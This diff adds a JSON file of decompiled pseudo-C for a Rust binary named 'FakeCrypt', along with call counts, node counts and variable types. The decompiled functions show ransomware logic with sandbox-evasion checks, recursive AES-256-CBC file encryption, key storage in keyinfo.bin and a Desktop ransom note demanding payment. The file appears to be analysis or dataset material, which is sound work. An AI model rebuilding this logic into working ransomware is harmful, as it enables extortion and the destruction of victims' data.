@@ -1,0 +1,953 @@
+{
+  "decompilation": {
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": "long long FakeCrypt::stealth::is_sandbox()\n{\n    char v0;  // [bp-0x218], Other Possible Types: unsigned long long\n    unsigned int v1;  // [bp-0x210], Other Possible Types: unsigned long long\n    unsigned long long v2;  // [bp-0x208]\n    char v3;  // [bp-0x200]\n    unsigned long long v4;  // [bp-0x1f8]\n    unsigned long long v5;  // [bp-0x1f0]\n    char v6;  // [bp-0x1e8]\n    char v7;  // [bp-0x1d0]\n    char v8;  // [bp-0x68]\n    unsigned long long v10;  // rbx\n    unsigned long v11;  // rdx\n\n    v7.new_all();\n    v10 = &v7 & 0xffffffffffffff00 | 1;\n    if (((char)sysinfo::common::System::physical_core_count() & 1) && v11 >= 2 && *((long long *)&v8) >= 0x200000)\n    {\n        hostname::get(&v0);\n        v3.unwrap_or_default(&v0);\n        v0.from_utf8_lossy(v4, v5);\n        alloc::str::<impl str>::to_lowercase(&v6, v1, v2);\n        core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v0);\n        ::0x44f7a0::core::ptr::drop_in_place<std::ffi::os_str::OsString>(&v3);\n        v0 = &g_4d91f0;\n        v1 = &g_4d9230;\n        if (!v0.any(&v6))\n        {\n            whoami::api::username(&v0);\n            alloc::str::<impl str>::to_lowercase(&v3, &g_4d9230, v2);\n            ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v0);\n            v0 = &g_4d9230;\n            v1 = &g_4d9260;\n            if (!v0.any(&v3))\n            {\n                v0 = std::time::Instant::now();\n                v1 = v11;\n                std::thread::sleep(2, 0);\n                if (v0.elapsed() >= 2)\n                {\n                    ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v3);\n                    ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v6);\n                    core::ptr::drop_in_place<sysinfo::common::System>(&v7);\n                    return 0;\n                }\n            }\n            ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v3);\n        }\n        v10 = v10 & 0xffffffffffffff00 | 1;\n        ::0x44f720::core::ptr::drop_in_place<alloc::string::String>(&v6);\n    }\n    core::ptr::drop_in_place<sysinfo::common::System>(&v7);\n    return v10 & 4294967295;\n}\n",
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": "void FakeCrypt::main()\n{\n    char *v0;  // [bp-0x168], Other Possible Types: unsigned long, unsigned long long\n    unsigned int v1;  // [bp-0x168]\n    unsigned int v2;  // [bp-0x168]\n    unsigned long v3;  // [bp-0x160], Other Possible Types: unsigned long long\n    int v4;  // [sp-0x158], Other Possible Types: unsigned long long [9], char *, unsigned long long\n    unsigned int v5;  // [bp-0x158]\n    unsigned int v6;  // [bp-0x158]\n    unsigned long long v7;  // [sp-0x150]\n    uint128_t v8;  // [bp-0x148]\n    void* v9;  // [bp-0x130], Other Possible Types: unsigned long, unsigned long long\n    unsigned long v10;  // [bp-0x128], Other Possible Types: unsigned long long\n    void* v11;  // [bp-0x120]\n    char v12;  // [bp-0x118], Other Possible Types: unsigned long\n    char v13;  // [bp-0x118], Other Possible Types: unsigned long\n    unsigned long v14;  // [bp-0x118]\n    int v15;  // [bp-0x117]\n    unsigned long long v16;  // [sp-0x110]\n    char *v17;  // [bp-0x108], Other Possible Types: unsigned long long\n    int v18;  // [bp-0x107]\n    int v19;  // [bp-0x100], Other Possible Types: unsigned long long\n    void* v20;  // [sp-0xf8]\n    int v21;  // [bp-0x68], Other Possible Types: char *\n    unsigned long long v22;  // [bp-0x60]\n    unsigned long long v23;  // [bp-0x50]\n    char v24;  // [bp-0x40]\n    unsigned long long v25[9];  // [bp-0x38], Other Possible Types: unsigned long long\n    unsigned long v26;  // [bp-0x30]\n    unsigned long v27;  // [bp-0x28]\n    unsigned long long v29[9];  // r12\n    unsigned long v30;  // r14\n    unsigned long v31;  // rbx\n    unsigned long long v35;  // rdx\n    uint128_t v36[2];  // rax\n    int v37;  // xmm0\n    uint128_t *v38;  // rax\n\n    if ((char)FakeCrypt::stealth::is_sandbox())\n    {\n        v12 = &g_4d9350;\n        v16 = 1;\n        v17 = 8;\n        *((uint128_t *)&v19) = 0;\n        std::io::stdio::_print(&(char)v12);\n        std::process::exit(1); /* do not return */\n    }\n    std::env::args(&(char)v12);\n    v24.collect(&(char)v12);\n    switch (v26)\n    {\n    case 3:\n        v29 = v25;\n        v27 = &v29[6];\n        v30 = v29[7];\n        v31 = v29[8];\n        std::fs::metadata(&(char)v12, v30, v31);\n        core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(&(char)v12);\n        if ((int)*((long long *)&v12) != 2 && (char)v30.is_dir(v31))\n        {\n            if ((char)v29[4].equal(v29[5], \"encryptdecrypt[+] Encrypting files in: [+] Dropping ransom note...\\n\", 7))\n            {\n                v23 = rand::rngs::thread::thread_rng();\n                v8 = 0;\n                *((uint128_t *)&v4) = 0;\n                *((uint128_t *)&v21) = 0;\n                v23.fill(&(char)v4);\n                v23.fill(&(char)v21);\n                v9 = v30;\n                v10 = v31;\n                v0 = &v9;\n                v3 = <std::path::Display as core::fmt::Display>::fmt;\n                v12 = &g_4d93a0;\n                v16 = 2;\n                v20 = 0;\n                v17 = &v0;\n                v19 = 1;\n                std::io::stdio::_print(&(char)v12);\n                FakeCrypt::fileops::encrypt_directory(v30, v31, &(char)v4, &(char)v21);\n                v12 = &g_4d93c0;\n                v16 = 1;\n                v17 = 8;\n                *((uint128_t *)&v19) = 0;\n                std::io::stdio::_print(&(char)v12);\n                FakeCrypt::fileops::drop_ransom_note();\n                (char)v12.create(\"keyinfo.binCould not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV\", 11);\n                v1 = (char)v12.expect(\"Failed to create key fileFailed to write keyFailed to write IV\", 25, &g_4d9518);\n                v1.write_all(&(char)v4, 32).expect(\"Failed to write keyFailed to write IV\", 19, &g_4d9530);\n                v1.write_all(&(char)v21, 16).expect(\"Failed to write IV\", 18, &g_4d9548);\n                v9 = &g_4d9478;\n                v10 = <&T as core::fmt::Display>::fmt;\n                v12 = &g_4d93d0;\n                v16 = 2;\n                v20 = 0;\n                v17 = &v9;\n                v19 = 1;\n                std::io::stdio::_print(&(char)v12);\n                ::0x4531d0::core::ptr::drop_in_place<std::fs::File>(v2);\n                core::ptr::drop_in_place<rand::rngs::thread::ThreadRng>(&v23);\n                ::0x453290::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v24);\n                return;\n            }\n            if ((char)v29[4].equal(v29[5], \"decrypt[+] Encrypting files in: [+] Dropping ransom note...\\n\", 7))\n            {\n                v4 = &g_4d9478;\n                v7 = <&T as core::fmt::Display>::fmt;\n                v12 = &g_4d93f0;\n                v16 = 2;\n                v20 = 0;\n                v17 = &v4;\n                v19 = 1;\n                std::io::stdio::_print(&(char)v12);\n                v9 = 0;\n                v10 = 1;\n                v11 = 0;\n                (char)v12.open(\"keyinfo.binCould not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV\", 11);\n                v5 = (char)v12.expect(\"Could not open key fileFailed to read key fileFailed to create key fileFailed to write keyFailed to write IV\", 23, &g_4d9488);\n                v5.read_to_end(&v9).expect(v35);\n                ::0x4531d0::core::ptr::drop_in_place<std::fs::File>(v6);\n                if (v11 != 48)\n                {\n                    v0 = v11;\n                    v4 = &v0;\n                    v7 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;\n                    v12 = &g_4d9410;\n                    v16 = 2;\n                    v20 = 0;\n                    v17 = &v4;\n                    v19 = 1;\n                    std::io::stdio::_eprint(&(char)v12);\n                    std::process::exit(1); /* do not return */\n                }\n                v36 = 0.index(32, v10, 48, &g_4d94b8);\n                if (v35 == 32)\n                {\n                    v37 = v36[0];\n                    *((uint128_t *)&v18) = v36[1];\n                    v15 = v37;\n                }\n                v13 = 1;\n                v5.unwrap(&v13);\n                v38 = 32.index(48, v10, v11, &g_4d94e8);\n                if (v35 == 16)\n                    *((uint128_t *)&v15) = *(v38);\n                *((char *)&v14) = 1;\n                (char)v23.unwrap(&(char)v14);\n                v0 = v30;\n                v3 = v31;\n                v21 = &v0;\n                v22 = <std::path::Display as core::fmt::Display>::fmt;\n                v13 = &g_4d9430;\n                v16 = 2;\n                v20 = 0;\n                v17 = &v21;\n                v19 = 1;\n                std::io::stdio::_print(&(char)v14);\n                FakeCrypt::fileops::decrypt_directory(v30, v31, &v5, &(char)v23);\n                v14 = &g_4d9450;\n                v16 = 1;\n                v17 = 8;\n                *((uint128_t *)&v19) = 0;\n                std::io::stdio::_print(&(char)v14);\n                ::0x453210::core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v9);\n                ::0x453290::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v24);\n                return;\n            }\n            if (!v26)\n                core::panicking::panic_bounds_check(0, 0, &g_4d9460); /* do not return */\n            v4[0] = v25;\n            v7 = <alloc::string::String as core::fmt::Display>::fmt;\n            v12 = &g_4d9360;\n            v16 = 2;\n            v20 = 0;\n            v17 = &v4;\n            v19 = 1;\n            std::io::stdio::_eprint(&(char)v12);\n        }\n        else\n        {\n            v4 = &v27;\n            v7 = <&T as core::fmt::Display>::fmt;\n            v12 = &g_4d9380;\n            v16 = 2;\n            v20 = 0;\n            v17 = &v4;\n            v19 = 1;\n            std::io::stdio::_eprint(&(char)v12);\n            break;\n        }\n    case 0:\n        core::panicking::panic_bounds_check(0, 0, &g_4d9560); /* do not return */\n    default:\n        v4 = v25;\n        v7 = <alloc::string::String as core::fmt::Display>::fmt;\n        v12 = &g_4d9360;\n        v16 = 2;\n        v20 = 0;\n        v17 = &v4;\n        v19 = 1;\n        std::io::stdio::_eprint(&(char)v12);\n        break;\n    }\n    std::process::exit(1); /* do not return */\n}\n",
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": "int FakeCrypt::fileops::encrypt_file(unsigned long long a0, unsigned long long a1, unsigned long long a2, unsigned long long a3)\n{\n    unsigned int v0;  // [bp-0x818]\n    struct struct_0 v1[1];  // [bp-0x811]\n    char v2;  // [bp-0x810]\n    char v3;  // [bp-0x80c]\n    void* v4;  // [bp-0x800]\n    unsigned long long v5;  // [bp-0x7f8]\n    void* v6;  // [bp-0x7f0]\n    struct struct_0 v7[16];  // [bp-0x7e8]\n    char *v8;  // [bp-0x7d8], Other Possible Types: unsigned int\n    unsigned int v9;  // [bp-0x7d8]\n    unsigned long long v10;  // [bp-0x7d0]\n    char *v11;  // [bp-0x7c8]\n    unsigned long long v12;  // [bp-0x7c0]\n    char v13;  // [bp-0x7b8], Other Possible Types: unsigned long\n    unsigned int v14;  // [bp-0x7b4]\n    unsigned long long v15;  // [bp-0x7b0]\n    char *v16;  // [bp-0x7a8]\n    unsigned long long v17;  // [bp-0x7a0]\n    void* v18;  // [bp-0x798]\n    char v19;  // [bp-0x3f8]\n    unsigned long long v21;  // rax\n    unsigned long long v22;  // rdx\n    unsigned long long v23;  // rdx\n    unsigned long long v24;  // rax\n    unsigned int v27;  // eax\n\n    *((unsigned long long *)&v7[0]) = a0;\n    v2.open(a0, a1);\n    if ((v2 & 1))\n        return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v2);\n    v0 = *((int *)&v3);\n    v4 = 0;\n    v5 = 1;\n    v6 = 0;\n    v21 = v0.read_to_end(&v4);\n    if (v21)\n    {\n        core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(v21, v22);\n    }\n    else\n    {\n        core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(0, v23);\n        v4.resize((9223372036854775792 & v6) + 16, 0);\n        v13.new(a2);\n        v19.inner_iv_init(&v13, a3);\n        v24 = v19.encrypt_padded_mut(1, v6, v6);\n        if (v24)\n        {\n            v13.create(v7, a1);\n            if (*((int *)&v13))\n            {\n                core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v13);\n            }\n            else\n            {\n                v8 = v14;\n                core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v8.write_all(v24, v23));\n                ::0x454540::core::ptr::drop_in_place<std::fs::File>(v9);\n            }\n        }\n        else\n        {\n            v8 = &v7[0].field_0;\n            v10 = <&T as core::fmt::Debug>::fmt;\n            v11 = &v1[0].field_0;\n            v12 = <inout::errors::PadError as core::fmt::Display>::fmt;\n            v13 = &g_4d95a0;\n            v15 = 3;\n            v18 = 0;\n            v16 = &v8;\n            v17 = 2;\n            std::io::stdio::_eprint(&v13);\n        }\n    }\n    ::0x4545c0::core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v4);\n    v27 = ::0x454540::core::ptr::drop_in_place<std::fs::File>(v0);\n    if (!(v2 & 1))\n        return v27;\n    return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v2);\n}\n",
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": "int FakeCrypt::fileops::decrypt_file(unsigned long long a0, unsigned long long a1, unsigned long long a2, unsigned long long a3)\n{\n    unsigned int v0;  // [bp-0x808]\n    struct struct_0 v1[1];  // [bp-0x801]\n    char v2;  // [bp-0x800]\n    char v3;  // [bp-0x7fc]\n    void* v4;  // [bp-0x7f0]\n    unsigned long long v5;  // [bp-0x7e8]\n    void* v6;  // [bp-0x7e0]\n    struct struct_0 v7[16];  // [bp-0x7d8]\n    char *v8;  // [bp-0x7c8], Other Possible Types: unsigned int\n    unsigned int v9;  // [bp-0x7c8]\n    unsigned long long v10;  // [bp-0x7c0]\n    char *v11;  // [bp-0x7b8]\n    unsigned long long v12;  // [bp-0x7b0]\n    unsigned long v13;  // [bp-0x7a8], Other Possible Types: unsigned long long\n    unsigned int v14;  // [bp-0x7a4]\n    unsigned long long v15;  // [bp-0x7a0]\n    void* v16;  // [bp-0x798], Other Possible Types: char *\n    unsigned long long v17;  // [bp-0x790]\n    void* v18;  // [bp-0x788]\n    char v19;  // [bp-0x3e8]\n    unsigned long long v21;  // rax\n    unsigned long long v22;  // rdx\n    unsigned long long v23;  // rdx\n    unsigned long long v24;  // rax\n    unsigned int v27;  // eax\n\n    *((unsigned long long *)&v7[0]) = a0;\n    v2.open(a0, a1);\n    if ((v2 & 1))\n        return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v2);\n    v0 = *((int *)&v3);\n    v4 = 0;\n    v5 = 1;\n    v6 = 0;\n    v21 = v0.read_to_end(&v4);\n    if (v21)\n    {\n        core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(v21, v22);\n    }\n    else\n    {\n        core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>(0, v23);\n        (char)v13.new(a2);\n        v19.inner_iv_init(&(char)v13, a3);\n        v13 = 1;\n        v15 = 1;\n        v16 = 0;\n        v24 = v19.decrypt_padded_inout_mut(&(char)v13);\n        if (v24)\n        {\n            (char)v13.create(v7, a1);\n            if ((int)v13)\n            {\n                core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&(char)v13);\n            }\n            else\n            {\n                v8 = v14;\n                core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v8.write_all(v24, v23));\n                ::0x454540::core::ptr::drop_in_place<std::fs::File>(v9);\n            }\n        }\n        else\n        {\n            v8 = &v7[0].field_0;\n            v10 = <&T as core::fmt::Debug>::fmt;\n            v11 = &v1[0].field_0;\n            v12 = <block_padding::UnpadError as core::fmt::Display>::fmt;\n            v13 = &g_4d95e8;\n            v15 = 3;\n            v18 = 0;\n            v16 = &v8;\n            v17 = 2;\n            std::io::stdio::_eprint(&(char)v13);\n        }\n    }\n    ::0x4545c0::core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v4);\n    v27 = ::0x454540::core::ptr::drop_in_place<std::fs::File>(v0);\n    if (!(v2 & 1))\n        return v27;\n    return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v2);\n}\n",
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": "long long FakeCrypt::fileops::encrypt_directory(unsigned long long a0, unsigned long long a1, unsigned long long a2, unsigned long long a3)\n{\n    char v0;  // [bp-0x120], Other Possible Types: unsigned long long\n    char v1;  // [bp-0x118]\n    unsigned long long v2;  // [bp-0x110]\n    unsigned long long v3;  // [bp-0x108]\n    unsigned long long v4;  // [bp-0x100]\n    int v5;  // [bp-0xf8]\n    int v6;  // [bp-0xe8]\n    unsigned long long v7;  // [bp-0xd8]\n    int v8;  // [bp-0xc8]\n    int v9;  // [bp-0xb8]\n    unsigned long long v10;  // [bp-0xa8]\n    void* v11;  // [bp-0xa0]\n    void* v12;  // [bp-0x70]\n    unsigned long long v13;  // [bp-0x40]\n    char v14;  // [bp-0x38]\n    unsigned long long v16;  // rax\n\n    std::fs::read_dir(&v0, a0, a1);\n    if (v1 == 2)\n        return core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>(&v0);\n    v11 = 0;\n    v12 = 0;\n    v13 = v0;\n    v14 = v1;\n    while (true)\n    {\n        v8.next(&v11);\n        if (!(long long)v8)\n            break;\n        v7 = v10;\n        v6 = v9;\n        v5 = v8;\n        v2.path(&v5);\n        if ((char)v3.is_dir(v4))\n            FakeCrypt::fileops::encrypt_directory(v3, v4, a2, a3);\n        else\n            FakeCrypt::fileops::encrypt_file(v3, v4, a2, a3);\n        ::0x454570::core::ptr::drop_in_place<std::path::PathBuf>(&v2);\n        core::ptr::drop_in_place<std::fs::DirEntry>(&v5);\n    }\n    v16 = (unsigned long long)core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>(&v11);\n    if (v1 != 2)\n        return v16;\n    return core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>(&v0);\n}\n",
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": "long long FakeCrypt::fileops::decrypt_directory(unsigned long long a0, unsigned long long a1, unsigned long long a2, unsigned long long a3)\n{\n    char v0;  // [bp-0x120], Other Possible Types: unsigned long long\n    char v1;  // [bp-0x118]\n    unsigned long long v2;  // [bp-0x110]\n    unsigned long long v3;  // [bp-0x108]\n    unsigned long long v4;  // [bp-0x100]\n    int v5;  // [bp-0xf8]\n    int v6;  // [bp-0xe8]\n    unsigned long long v7;  // [bp-0xd8]\n    int v8;  // [bp-0xc8]\n    int v9;  // [bp-0xb8]\n    unsigned long long v10;  // [bp-0xa8]\n    void* v11;  // [bp-0xa0]\n    void* v12;  // [bp-0x70]\n    unsigned long long v13;  // [bp-0x40]\n    char v14;  // [bp-0x38]\n    unsigned long long v16;  // rax\n\n    std::fs::read_dir(&v0, a0, a1);\n    if (v1 == 2)\n        return core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>(&v0);\n    v11 = 0;\n    v12 = 0;\n    v13 = v0;\n    v14 = v1;\n    while (true)\n    {\n        v8.next(&v11);\n        if (!(long long)v8)\n            break;\n        v7 = v10;\n        v6 = v9;\n        v5 = v8;\n        v2.path(&v5);\n        if ((char)v3.is_dir(v4))\n            FakeCrypt::fileops::decrypt_directory(v3, v4, a2, a3);\n        else\n            FakeCrypt::fileops::decrypt_file(v3, v4, a2, a3);\n        ::0x454570::core::ptr::drop_in_place<std::path::PathBuf>(&v2);\n        core::ptr::drop_in_place<std::fs::DirEntry>(&v5);\n    }\n    v16 = (unsigned long long)core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>(&v11);\n    if (v1 != 2)\n        return v16;\n    return core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>(&v0);\n}\n",
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": "int FakeCrypt::fileops::drop_ransom_note()\n{\n    unsigned int v0;  // [bp-0x64]\n    char v1;  // [bp-0x60]\n    unsigned int v2;  // [bp-0x60]\n    int v3;  // [bp-0x5c]\n    unsigned long long v4;  // [bp-0x50]\n    int v5;  // [bp-0x48]\n    unsigned long long v6;  // [bp-0x40]\n    unsigned long long v7;  // [bp-0x38]\n    char v8;  // [bp-0x28]\n    unsigned long v10;  // rbp\n    unsigned int v12;  // eax\n\n    dirs::desktop_dir(&(char)v2);\n    if ((char)(((0 ^ *((long long *)&v1)) & (0 ^ -(*((long long *)&v1)))) >> 63))\n    {\n        std::sys::pal::unix::os::split_paths::bytes_to_path(&(char)v5, \"/tmp_DIRKindbool\", 4);\n    }\n    else\n    {\n        v7 = v4;\n        *((int128_t *)&v5) = *((int128_t *)&v1);\n    }\n    v8.join(v6, v7, \"README_RECOVER_FILES.txt\", 24);\n    (char)v2.create(&v8);\n    v10 = v2;\n    if ((unsigned int)v10 != 1)\n    {\n        v0 = (int)v3;\n        core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v0.write_all(\"\\nYour files have been encrypted.\\n\\nTo recover them, you must pay the ransom.\\n\\nFailure to do so will result in permanent loss of your data.\\n\", 138));\n        ::0x454540::core::ptr::drop_in_place<std::fs::File>(v0);\n    }\n    v12 = (unsigned int)::0x454570::core::ptr::drop_in_place<std::path::PathBuf>(&(char)v5);\n    if (!(char)v10)\n        return v12;\n    return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&(char)v2);\n}\n"
+  },
+  "function_call_counts": {
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {
+      "core::ptr::drop_in_place<sysinfo::common::System>": 2,
+      "core::ptr::drop_in_place<alloc::string::String>": 5,
+      "std::time::Instant::now": 1,
+      "std::thread::sleep": 1,
+      "alloc::str::<impl str>::to_lowercase": 2,
+      "whoami::api::username": 1,
+      "core::ptr::drop_in_place<std::ffi::os_str::OsString>": 1,
+      "core::ptr::drop_in_place<alloc::borrow::Cow<str>>": 1,
+      "alloc::string::String::from_utf8_lossy": 1,
+      "core::result::Result<T,E>::unwrap_or_default": 1,
+      "hostname::get": 1,
+      "sysinfo::common::System::new_all": 1
+    },
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {
+      "std::process::exit": 3,
+      "std::io::stdio::_print": 7,
+      "std::io::stdio::_eprint": 4,
+      "core::panicking::panic_bounds_check": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "FakeCrypt::fileops::decrypt_directory": 1,
+      "core::result::Result<T,E>::unwrap": 2,
+      "<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index": 2,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "core::result::Result<T,E>::expect": 5,
+      "<std::fs::File as std::io::Read>::read_to_end": 1,
+      "std::fs::File::open": 1,
+      "core::ptr::drop_in_place<rand::rngs::thread::ThreadRng>": 1,
+      "std::io::Write::write_all": 2,
+      "std::fs::File::create": 1,
+      "FakeCrypt::fileops::drop_ransom_note": 1,
+      "FakeCrypt::fileops::encrypt_directory": 1,
+      "rand::rng::Rng::fill": 2,
+      "rand::rngs::thread::thread_rng": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>": 1,
+      "std::fs::metadata": 1,
+      "core::iter::traits::iterator::Iterator::collect": 1,
+      "std::env::args": 1
+    },
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 3,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>": 2,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "std::io::Write::write_all": 1,
+      "std::fs::File::create": 1,
+      "std::io::stdio::_eprint": 1,
+      "cipher::block::BlockEncryptMut::encrypt_padded_mut": 1,
+      "<cbc::decrypt::Decryptor<C> as crypto_common::InnerIvInit>::inner_iv_init": 1,
+      "<aes::autodetect::Aes256 as crypto_common::KeyInit>::new": 1,
+      "alloc::vec::Vec<T,A>::resize": 1,
+      "<std::fs::File as std::io::Read>::read_to_end": 1,
+      "std::fs::File::open": 1
+    },
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 3,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>": 2,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "std::io::Write::write_all": 1,
+      "std::fs::File::create": 1,
+      "std::io::stdio::_eprint": 1,
+      "cipher::block::BlockDecryptMut::decrypt_padded_inout_mut": 1,
+      "<cbc::decrypt::Decryptor<C> as crypto_common::InnerIvInit>::inner_iv_init": 1,
+      "<aes::autodetect::Aes256 as crypto_common::KeyInit>::new": 1,
+      "<std::fs::File as std::io::Read>::read_to_end": 1,
+      "std::fs::File::open": 1
+    },
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {
+      "core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>": 2,
+      "core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>": 1,
+      "core::ptr::drop_in_place<std::fs::DirEntry>": 1,
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "FakeCrypt::fileops::encrypt_directory": 1,
+      "FakeCrypt::fileops::encrypt_file": 1,
+      "std::fs::DirEntry::path": 1,
+      "<core::iter::adapters::flatten::FlattenCompat<I,U> as core::iter::traits::iterator::Iterator>::next": 1,
+      "std::fs::read_dir": 1
+    },
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {
+      "core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>": 2,
+      "core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>": 1,
+      "core::ptr::drop_in_place<std::fs::DirEntry>": 1,
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "FakeCrypt::fileops::decrypt_directory": 1,
+      "FakeCrypt::fileops::decrypt_file": 1,
+      "std::fs::DirEntry::path": 1,
+      "<core::iter::adapters::flatten::FlattenCompat<I,U> as core::iter::traits::iterator::Iterator>::next": 1,
+      "std::fs::read_dir": 1
+    },
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 1,
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 1,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "std::io::Write::write_all": 1,
+      "std::fs::File::create": 1,
+      "std::path::Path::join": 1,
+      "std::sys::pal::unix::os::split_paths::bytes_to_path": 1,
+      "dirs::desktop_dir": 1
+    }
+  },
+  "macro_call_counts": {
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {},
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {},
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {},
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {},
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {},
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {},
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {}
+  },
+  "node_counts": {
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": 22,
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": 46,
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": 19,
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": 18,
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": 12,
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": 12,
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": 12
+  },
+  "variable_types": {
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {
+      "stack_72": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_432": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {
+      "stack_80": [
+        [
+          "primitive",
+          1
+        ],
+        [
+          "primitive",
+          1
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
